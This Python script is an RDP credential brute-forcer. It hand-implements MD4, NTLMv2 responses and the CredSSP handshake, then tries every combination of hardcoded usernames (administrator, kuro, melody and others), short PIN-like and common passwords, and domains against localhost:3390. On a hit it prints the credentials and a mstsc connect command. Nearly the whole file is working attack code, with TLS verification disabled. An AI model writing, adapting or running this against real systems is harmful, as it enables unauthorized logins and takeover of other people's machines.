import socket
import struct
import ssl
import hmac
import os
import time

def md4(data):
    def lr(x, n): return ((x << n) | (x >> (32 - n))) & 0xffffffff
    def F(x, y, z): return (x & y) | (~x & z)
    def G(x, y, z): return (x & y) | (x & z) | (y & z)
    def H(x, y, z): return x ^ y ^ z
    msg = bytearray(data); msg_len = len(data); msg.append(0x80)
    while len(msg) % 64 != 56: msg.append(0)
    msg += struct.pack('<Q', msg_len * 8)
    A, B, C, D = 0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476
    for i in range(0, len(msg), 64):
        X = struct.unpack('<16I', msg[i:i+64]); AA, BB, CC, DD = A, B, C, D
        for j in range(16): A = lr((A + F(B,C,D) + X[j]) & 0xffffffff, [3,7,11,19][j%4]); A, B, C, D = D, A, B, C
        for j in range(16): k = [0,4,8,12,1,5,9,13,2,6,10,14,3,7,11,15][j]; A = lr((A + G(B,C,D) + X[k] + 0x5a827999) & 0xffffffff, [3,5,9,13][j%4]); A, B, C, D = D, A, B, C
        for j in range(16): k = [0,8,4,12,2,10,6,14,1,9,5,13,3,11,7,15][j]; A = lr((A + H(B,C,D) + X[k] + 0x6ed9eba1) & 0xffffffff, [3,9,11,15][j%4]); A, B, C, D = D, A, B, C
        A, B, C, D = (A+AA)&0xffffffff, (B+BB)&0xffffffff, (C+CC)&0xffffffff, (D+DD)&0xffffffff
    return struct.pack('<4I', A, B, C, D)

def nth(p): return md4(p.encode('utf-16le'))
def v2r(h, u, d, sc, cc, ts, ti):
    v2h = hmac.new(h, (u.upper() + d.upper()).encode('utf-16le'), 'md5').digest()
    blob = b'\x01\x01\x00\x00\x00\x00\x00\x00' + ts + cc + b'\x00\x00\x00\x00' + ti + b'\x00\x00\x00\x00'
    return hmac.new(v2h, sc + blob, 'md5').digest() + blob

def try_cred(host, port, user, pwd, dom):
    try:
        ck = f"Cookie: mstshash={user}\r\n".encode()
        ng = bytes([0x01,0x00,0x08,0x00,0x03,0x00,0x00,0x00])
        x2 = bytes([0xe0,0,0,0,0,0]) + ck + ng
        cr = bytes([0x03,0x00]) + struct.pack(">H", 5+len(x2)) + bytes([len(x2)]) + x2
        sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM); sk.settimeout(10)
        sk.connect((host, port)); sk.sendall(cr)
        if sk.recv(1024)[5] != 0xd0: return False
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT); ctx.check_hostname = False; ctx.verify_mode = ssl.CERT_NONE
        ss = ctx.wrap_socket(sk, server_hostname=host)
        nn = b"NTLMSSP\x00\x01\x00\x00\x00\xb7\x82\x08\xe2" + b"\x00"*16 + b"\x0a\x00\x63\x45\x00\x00\x00\x0f"
        ss.send(bytes([0x30,0x37,0xa0,0x03,0x02,0x01,0x06,0xa1,0x30,0x30,0x2e,0x30,0x2c,0xa0,0x2a,0x04,0x28]) + nn)
        cr = ss.recv(4096)
        if b"NTLMSSP" not in cr: return False
        nm = cr[cr.find(b"NTLMSSP"):]; sc = nm[24:32]
        til, tio = struct.unpack("<H", nm[40:42])[0], struct.unpack("<I", nm[44:48])[0]
        ti = nm[tio:tio+til]; ts = None; i = 0
        while i < len(ti)-4:
            aid, aln = struct.unpack("<HH", ti[i:i+4])
            if aid == 7: ts = ti[i+4:i+12]; break
            if aid == 0: break
            i += 4 + aln
        if not ts: ts = struct.pack("<Q", int(time.time()*10000000)+116444736000000000)
        h = nth(pwd); cc = os.urandom(8); nr = v2r(h, user, dom, sc, cc, ts, ti); lr = cc + b'\x00'*16
        db, ub, wb = dom.encode('utf-16le'), user.encode('utf-16le'), b'PC\x00'
        of = 88; am = b'NTLMSSP\x00\x03\x00\x00\x00'
        for x in [lr, nr, db, ub, wb]: am += struct.pack('<HHI', len(x), len(x), of); of += len(x)
        am += struct.pack('<HHI', 0, 0, of) + struct.pack('<I', 0xe2888215) + b'\x0a\x00\x63\x45\x00\x00\x00\x0f' + lr + nr + db + ub + wb
        al = len(am)
        ca = bytes([0x30,0x82]) + struct.pack(">H", al+15) + bytes([0xa0,0x03,0x02,0x01,0x06,0xa2,0x82]) + struct.pack(">H", al+6)
        ca += bytes([0x30,0x82]) + struct.pack(">H", al+2) + bytes([0x04,0x82]) + struct.pack(">H", al) + am
        ss.send(ca)
        try:
            ar = ss.recv(4096)
            if ar and ar[0] == 0x30 and b'\xa3' in ar[:30]: return True
            if ar and ar[0] == 0x30 and len(ar) > 50: return "maybe"
        except: pass
        ss.close(); return False
    except: return False

print("=== COMPREHENSIVE CREDENTIAL TEST ===\n")

users = ["administrator", "Administrator", "admin", "Admin", "kuro", "Kuro", "melody", "Melody", "user", "User", "guest"]
passwords = ["1121", "0114", "0441", "1140", "4410", "1234", "12345", "123456", "password", "Password", "admin", "Admin", "welcome", "Welcome", ""]
domains = ["", "meltat0", "MELTAT0", "."]

total = len(users) * len(passwords) * len(domains)
print(f"Testing {total} combinations...\n")

count = 0
for dom in domains:
    for user in users:
        for pwd in passwords:
            count += 1
            dsp = dom if dom else "(local)"
            print(f"[{count}/{total}] {dsp}\{user}:{pwd or '(empty)'}...", end=" ", flush=True)
            r = try_cred("localhost", 3390, user, pwd, dom)
            if r == True:
                print("SUCCESS!")
                print(f"\n*** FOUND: {dom}\{user}:{pwd} ***")
                print(f"*** RUN: mstsc /v:localhost:3390 ***")
                exit(0)
            elif r == "maybe":
                print("POSSIBLE!")
            else:
                print("no")
            time.sleep(0.15)

print("\n=== NO VALID CREDENTIALS FOUND ===")
